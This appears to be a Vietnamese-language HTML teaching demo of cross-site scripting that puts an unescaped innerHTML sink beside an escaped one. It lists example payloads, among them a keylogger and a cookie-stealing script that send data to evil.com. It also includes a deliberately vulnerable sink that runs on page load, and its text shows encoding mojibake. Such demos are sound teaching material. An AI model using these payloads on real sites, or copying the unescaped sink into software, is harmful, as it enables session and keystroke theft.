<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo XSS Vulnerability - So S√°nh Tr∆∞·ªõc/Sau</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        background: #f5f5f5;
      }
      .container {
        background: white;
        padding: 20px;
        margin: 20px 0;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .danger {
        background: #fee;
        border-left: 4px solid #f00;
        padding: 15px;
        margin: 10px 0;
      }
      .safe {
        background: #efe;
        border-left: 4px solid #0a0;
        padding: 15px;
        margin: 10px 0;
      }
      input,
      button {
        padding: 8px;
        margin: 5px;
      }
      button {
        background: #007bff;
        color: white;
        border: none;
        cursor: pointer;
        border-radius: 4px;
      }
      button:hover {
        background: #0056b3;
      }
      table {
        width: 100%;
        border-collapse: collapse;
        margin: 10px 0;
      }
      th,
      td {
        border: 1px solid #ddd;
        padding: 8px;
        text-align: left;
      }
      th {
        background: #f0f0f0;
      }
      .code {
        background: #f4f4f4;
        padding: 10px;
        border-radius: 4px;
        font-family: monospace;
        margin: 10px 0;
        overflow-x: auto;
      }
      h2 {
        color: #333;
      }
    </style>
  </head>
  <body>
    <h1>üîí Demo XSS Vulnerability - So S√°nh Tr∆∞·ªõc/Sau</h1>

    <div class="container">
      <h2>üìù H∆∞·ªõng D·∫´n S·ª≠ D·ª•ng</h2>
      <div
        style="
          background: #e7f3ff;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 15px;
        "
      >
        <h3 style="margin-top: 0; color: #0066cc">üéØ M·ª•c ƒê√≠ch:</h3>
        <p>
          Demo n√†y gi√∫p b·∫°n hi·ªÉu XSS l√† g√¨ v√† t·∫°i sao c·∫ßn escape HTML tr∆∞·ªõc khi
          hi·ªÉn th·ªã d·ªØ li·ªáu.
        </p>
      </div>
      <ol>
        <li>
          <strong>B∆∞·ªõc 1:</strong> Nh·∫≠p script v√†o √¥ input b√™n d∆∞·ªõi (v√≠ d·ª•:
          <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>)
        </li>
        <li><strong>B∆∞·ªõc 2:</strong> Click n√∫t <strong>"Test XSS"</strong></li>
        <li>
          <strong>B∆∞·ªõc 3:</strong> Quan s√°t k·∫øt qu·∫£ ·ªü 2 ph·∫ßn:
          <ul>
            <li>
              <strong style="color: red">‚ùå TR∆Ø·ªöC (Nguy hi·ªÉm):</strong> Script
              s·∫Ω CH·∫†Y (c√≥ popup alert)
            </li>
            <li>
              <strong style="color: green">‚úÖ SAU (An to√†n):</strong> Script ch·ªâ
              hi·ªÉn th·ªã nh∆∞ TEXT (kh√¥ng ch·∫°y)
            </li>
          </ul>
        </li>
        <li>
          <strong>B∆∞·ªõc 4:</strong> Th·ª≠ c√°c n√∫t kh√°c:
          <ul>
            <li><strong>"Test Image XSS":</strong> Test v·ªõi th·∫ª img</li>
            <li>
              <strong>"Test Keylogger":</strong> Test script ghi l·∫°i ph√≠m g√µ
            </li>
          </ul>
        </li>
      </ol>
      <div
        style="
          background: #fff3cd;
          padding: 10px;
          border-radius: 4px;
          margin-top: 10px;
        "
      >
        <strong>üí° Tip:</strong> N·∫øu b·∫°n th·∫•y popup alert ·ªü ph·∫ßn TR∆Ø·ªöC, ƒë√≥ l√†
        b·∫±ng ch·ª©ng script ƒë√£ ƒë∆∞·ª£c th·ª±c thi (nguy hi·ªÉm!). Ph·∫ßn SAU kh√¥ng c√≥ popup
        v√¨ script b·ªã escape th√†nh text thu·∫ßn (an to√†n!).
      </div>
    </div>

    <div class="container">
      <h2>üß™ Test Input</h2>
      <input
        type="text"
        id="testInput"
        placeholder="Nh·∫≠p script test: <script>alert('XSS')</script>"
        value='<script>alert("XSS Attack!")</script>'
        style="width: 400px"
      />
      <button onclick="testXSS()">Test XSS</button>
      <button onclick="testImageXSS()">Test Image XSS</button>
      <button onclick="testKeylogger()">Test Keylogger</button>
      <button onclick="clearResults()">X√≥a k·∫øt qu·∫£</button>
    </div>

    <div class="container danger">
      <h2>‚ùå TR∆Ø·ªöC (Nguy hi·ªÉm - Kh√¥ng escape)</h2>
      <div
        style="
          background: #ffebee;
          padding: 10px;
          border-radius: 4px;
          margin-bottom: 10px;
        "
      >
        <strong>‚ö†Ô∏è C·∫¢NH B√ÅO:</strong> Ph·∫ßn n√†y c√≥ l·ªó h·ªïng XSS. Script s·∫Ω ƒë∆∞·ª£c
        th·ª±c thi!
      </div>
      <p>
        <strong>C√°ch ho·∫°t ƒë·ªông:</strong> Ch√®n tr·ª±c ti·∫øp v√†o innerHTML m√† kh√¥ng
        escape
      </p>
      <div class="code">
        innerHTML = `&lt;td&gt;${userInput}&lt;/td&gt;`; // ‚ùå Nguy hi·ªÉm!
      </div>
      <p>
        <strong>K·∫øt qu·∫£ mong ƒë·ª£i:</strong> Script s·∫Ω CH·∫†Y (c√≥ popup alert) ‚Üí R·∫•t
        nguy hi·ªÉm!
      </p>
      <div id="dangerousResult">
        <p>Nh·∫≠p input v√† click "Test XSS" ƒë·ªÉ xem k·∫øt qu·∫£</p>
      </div>
      <div id="dangerousTable"></div>
    </div>

    <div class="container safe">
      <h2>‚úÖ SAU (An to√†n - C√≥ escape)</h2>
      <div
        style="
          background: #e8f5e9;
          padding: 10px;
          border-radius: 4px;
          margin-bottom: 10px;
        "
      >
        <strong>‚úÖ AN TO√ÄN:</strong> Ph·∫ßn n√†y ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá. Script ch·ªâ hi·ªÉn
        th·ªã nh∆∞ text!
      </div>
      <p>
        <strong>C√°ch ho·∫°t ƒë·ªông:</strong> Escape HTML tr∆∞·ªõc khi ch√®n v√†o
        innerHTML
      </p>
      <div class="code">
        innerHTML = `&lt;td&gt;${escapeHTML(userInput)}&lt;/td&gt;`; // ‚úÖ An
        to√†n!
      </div>
      <p>
        <strong>K·∫øt qu·∫£ mong ƒë·ª£i:</strong> Script b·ªã escape th√†nh text ‚Üí Kh√¥ng
        ch·∫°y ‚Üí An to√†n!
      </p>
      <div id="safeResult">
        <p>Nh·∫≠p input v√† click "Test XSS" ƒë·ªÉ xem k·∫øt qu·∫£</p>
      </div>
      <div id="safeTable"></div>
    </div>

    <div class="container">
      <h2>üìä So S√°nh K·∫øt Qu·∫£</h2>
      <p style="color: #666; font-size: 14px; margin-bottom: 15px">
        B·∫£ng so s√°nh d∆∞·ªõi ƒë√¢y gi√∫p b·∫°n hi·ªÉu r√µ s·ª± kh√°c bi·ªát gi·ªØa code nguy hi·ªÉm
        v√† code an to√†n.
      </p>
      <table>
        <thead>
          <tr>
            <th>Ti√™u ch√≠</th>
            <th>TR∆Ø·ªöC (Nguy hi·ªÉm)</th>
            <th>SAU (An to√†n)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Script c√≥ ch·∫°y kh√¥ng?</strong></td>
            <td style="color: red; font-weight: bold">
              ‚ùå C√ì - Script ƒë∆∞·ª£c th·ª±c thi
            </td>
            <td style="color: green; font-weight: bold">
              ‚úÖ KH√îNG - Script b·ªã escape th√†nh text
            </td>
          </tr>
          <tr>
            <td><strong>Hi·ªÉn th·ªã nh∆∞ th·∫ø n√†o?</strong></td>
            <td>Script ch·∫°y, c√≥ th·ªÉ c√≥ popup, redirect, keylogger, v.v.</td>
            <td>
              Hi·ªÉn th·ªã nh∆∞ text thu·∫ßn:
              <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            </td>
          </tr>
          <tr>
            <td><strong>Popup alert?</strong></td>
            <td style="color: red">‚ùå C√ì (n·∫øu script c√≥ alert)</td>
            <td style="color: green">‚úÖ KH√îNG</td>
          </tr>
          <tr>
            <td><strong>B·∫£o m·∫≠t</strong></td>
            <td style="color: red; font-weight: bold">
              ‚ùå R·∫•t nguy hi·ªÉm - C√≥ th·ªÉ b·ªã t·∫•n c√¥ng
            </td>
            <td style="color: green; font-weight: bold">
              ‚úÖ An to√†n - ƒê√£ ƒë∆∞·ª£c b·∫£o v·ªá
            </td>
          </tr>
          <tr>
            <td><strong>Khuy·∫øn ngh·ªã</strong></td>
            <td style="color: red">‚ùå KH√îNG N√äN d√πng trong production</td>
            <td style="color: green">‚úÖ N√äN d√πng trong production</td>
          </tr>
        </tbody>
      </table>
      <div
        style="
          background: #e3f2fd;
          padding: 15px;
          border-radius: 4px;
          margin-top: 15px;
        "
      >
        <h4 style="margin-top: 0; color: #1976d2">üí° Ghi Nh·ªõ:</h4>
        <ul style="margin-bottom: 0">
          <li>
            <strong>TR∆Ø·ªöC:</strong> Script ch·∫°y ‚Üí Nguy hi·ªÉm ‚Üí C√≥ th·ªÉ b·ªã t·∫•n c√¥ng
          </li>
          <li>
            <strong>SAU:</strong> Script ch·ªâ l√† text ‚Üí An to√†n ‚Üí ƒê√£ ƒë∆∞·ª£c b·∫£o v·ªá
          </li>
          <li>
            <strong>K·∫øt lu·∫≠n:</strong> Lu√¥n lu√¥n escape HTML tr∆∞·ªõc khi hi·ªÉn th·ªã
            d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng!
          </li>
        </ul>
      </div>
    </div>

    <div class="container">
      <h2>üéØ C√°c K·ªãch B·∫£n T·∫•n C√¥ng (V√≠ D·ª•)</h2>
      <p style="color: #666; font-size: 14px; margin-bottom: 15px">
        D∆∞·ªõi ƒë√¢y l√† c√°c v√≠ d·ª• v·ªÅ c√°ch k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ khai th√°c l·ªó h·ªïng XSS.
        <strong>L∆∞u √Ω:</strong> Ch·ªâ d√πng ƒë·ªÉ h·ªçc t·∫≠p, kh√¥ng s·ª≠ d·ª•ng ƒë·ªÉ t·∫•n c√¥ng
        h·ªá th·ªëng th·ª±c t·∫ø.
      </p>

      <h3>1. Basic XSS (XSS C∆° B·∫£n)</h3>
      <div class="code">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
      <p style="font-size: 13px; color: #666">
        ‚Üí Hi·ªÉn th·ªã popup alert. ƒê∆°n gi·∫£n nh·∫•t ƒë·ªÉ test XSS.
      </p>

      <h3>2. Image XSS (XSS Qua Th·∫ª Img)</h3>
      <div class="code">&lt;img src=x onerror="alert('XSS')"&gt;</div>
      <p style="font-size: 13px; color: #666">
        ‚Üí Khi image kh√¥ng t·∫£i ƒë∆∞·ª£c, script trong onerror s·∫Ω ch·∫°y.
      </p>

      <h3>3. Keylogger (Ghi L·∫°i Ph√≠m G√µ)</h3>
      <div class="code">
        &lt;script&gt;document.addEventListener('keypress', e =&gt;
        fetch('https://evil.com?key=' + e.key))&lt;/script&gt;
      </div>
      <p style="font-size: 13px; color: #666">
        ‚Üí Ghi l·∫°i m·ªçi ph√≠m b·∫°n g√µ v√† g·ª≠i ƒë·∫øn server c·ªßa k·∫ª t·∫•n c√¥ng.
      </p>

      <h3>4. ƒê√°nh C·∫Øp Cookie</h3>
      <div class="code">
        &lt;script&gt;new
        Image().src='https://evil.com?cookie='+document.cookie&lt;/script&gt;
      </div>
      <p style="font-size: 13px; color: #666">
        ‚Üí ƒê√°nh c·∫Øp cookie session ƒë·ªÉ ƒëƒÉng nh·∫≠p nh∆∞ ng∆∞·ªùi d√πng kh√°c.
      </p>

      <h3>5. Redirect ƒê·∫øn Trang ƒê·ªôc H·∫°i</h3>
      <div class="code">
        &lt;script&gt;window.location='https://fake-login.com'&lt;/script&gt;
      </div>
      <p style="font-size: 13px; color: #666">
        ‚Üí Chuy·ªÉn h∆∞·ªõng ng∆∞·ªùi d√πng ƒë·∫øn trang phishing gi·∫£.
      </p>

      <div
        style="
          background: #ffebee;
          padding: 15px;
          border-radius: 4px;
          margin-top: 20px;
        "
      >
        <h4 style="margin-top: 0; color: #c62828">üõ°Ô∏è C√°ch B·∫£o V·ªá:</h4>
        <p style="margin-bottom: 0">
          <strong>Lu√¥n lu√¥n escape HTML tr∆∞·ªõc khi hi·ªÉn th·ªã:</strong><br />
          <code style="background: white; padding: 5px; border-radius: 3px">
            escapeHTML(userInput)
          </code>
        </p>
      </div>
    </div>

    <script>
      // H√†m escape HTML (gi·ªëng nh∆∞ trong utils/dom.js)
      function escapeHTML(text) {
        if (text == null) return "";
        const map = {
          "&": "&amp;",
          "<": "&lt;",
          ">": "&gt;",
          '"': "&quot;",
          "'": "&#039;",
        };
        return String(text).replace(/[&<>"']/g, (m) => map[m]);
      }

      function testXSS() {
        const input = document.getElementById("testInput").value;

        // ‚ùå NGUY HI·ªÇM - Kh√¥ng escape
        const dangerousDiv = document.getElementById("dangerousResult");
        dangerousDiv.innerHTML = `
        <p><strong>K·∫øt qu·∫£ (KH√îNG escape):</strong></p>
        <div style="background: #fff3cd; padding: 10px; border-radius: 4px;">
          ${input}  <!-- ‚ùå Script s·∫Ω ch·∫°y ·ªü ƒë√¢y! -->
        </div>
        <p style="color: red; font-weight: bold;">‚ö†Ô∏è Script ƒë√£ ƒë∆∞·ª£c th·ª±c thi! (N·∫øu c√≥ popup, ƒë√≥ l√† b·∫±ng ch·ª©ng XSS)</p>
        <p style="color: #d32f2f; font-size: 14px; margin-top: 10px;">
          <strong>üí• Nguy hi·ªÉm:</strong> Script n√†y c√≥ th·ªÉ ƒë√°nh c·∫Øp cookie, redirect, keylogger, v.v.
          Trong ·ª©ng d·ª•ng th·ª±c t·∫ø, ƒë√¢y l√† l·ªó h·ªïng b·∫£o m·∫≠t nghi√™m tr·ªçng!
        </p>
      `;

        // ‚úÖ AN TO√ÄN - C√≥ escape
        const safeDiv = document.getElementById("safeResult");
        safeDiv.innerHTML = `
        <p><strong>K·∫øt qu·∫£ (C√ì escape):</strong></p>
        <div style="background: #d4edda; padding: 10px; border-radius: 4px;">
          ${escapeHTML(input)}  <!-- ‚úÖ Script b·ªã escape, ch·ªâ l√† text -->
        </div>
        <p style="color: green; font-weight: bold;">‚úÖ Script ƒë√£ b·ªã escape, ch·ªâ hi·ªÉn th·ªã nh∆∞ text thu·∫ßn</p>
        <p style="color: #388e3c; font-size: 14px; margin-top: 10px;">
          <strong>üõ°Ô∏è An to√†n:</strong> Script b·ªã chuy·ªÉn th√†nh HTML entities (&lt;script&gt; ‚Üí &amp;lt;script&amp;gt;).
          Tr√¨nh duy·ªát hi·ªÉu ƒë√≥ l√† text, kh√¥ng ph·∫£i code JavaScript. ƒê√¢y l√† c√°ch ƒë√∫ng ƒë·ªÉ b·∫£o v·ªá ·ª©ng d·ª•ng!
        </p>
      `;

        // Hi·ªÉn th·ªã trong table
        document.getElementById("dangerousTable").innerHTML = `
        <table>
          <thead><tr><th>T√™n</th><th>Email</th></tr></thead>
          <tbody>
            <tr>
              <td>${input}</td>  <!-- ‚ùå Nguy hi·ªÉm -->
              <td>user@example.com</td>
            </tr>
          </tbody>
        </table>
      `;

        document.getElementById("safeTable").innerHTML = `
        <table>
          <thead><tr><th>T√™n</th><th>Email</th></tr></thead>
          <tbody>
            <tr>
              <td>${escapeHTML(input)}</td>  <!-- ‚úÖ An to√†n -->
              <td>user@example.com</td>
            </tr>
          </tbody>
        </table>
      `;
      }

      function testImageXSS() {
        document.getElementById("testInput").value =
          "<img src=x onerror=\"alert('Image XSS!')\">";
        testXSS();
      }

      function testKeylogger() {
        // S·ª≠ d·ª•ng c√°ch vi·∫øt an to√†n - t√°ch th·∫ª script ƒë·ªÉ tr√°nh HTML parser nh·∫ßm l·∫´n
        // Template literal v·ªõi escape ƒë·ªÉ tr√°nh l·ªói syntax
        const scriptOpen = "<script>";
        const scriptClose = "</" + "script>";
        const keyloggerCode =
          'document.addEventListener("keypress", function(e) { console.log("Key pressed:", e.key); alert("Keylogger activated! Check console."); });';
        const keyloggerScript = scriptOpen + keyloggerCode + scriptClose;
        document.getElementById("testInput").value = keyloggerScript;
        testXSS();
      }

      function clearResults() {
        document.getElementById("dangerousResult").innerHTML =
          '<p>Nh·∫≠p input v√† click "Test XSS" ƒë·ªÉ xem k·∫øt qu·∫£</p>';
        document.getElementById("safeResult").innerHTML =
          '<p>Nh·∫≠p input v√† click "Test XSS" ƒë·ªÉ xem k·∫øt qu·∫£</p>';
        document.getElementById("dangerousTable").innerHTML = "";
        document.getElementById("safeTable").innerHTML = "";
      }

      // T·ª± ƒë·ªông test khi load trang
      window.addEventListener("load", () => {
        setTimeout(() => {
          testXSS();
        }, 500);
      });
    </script>
  </body>
</html>
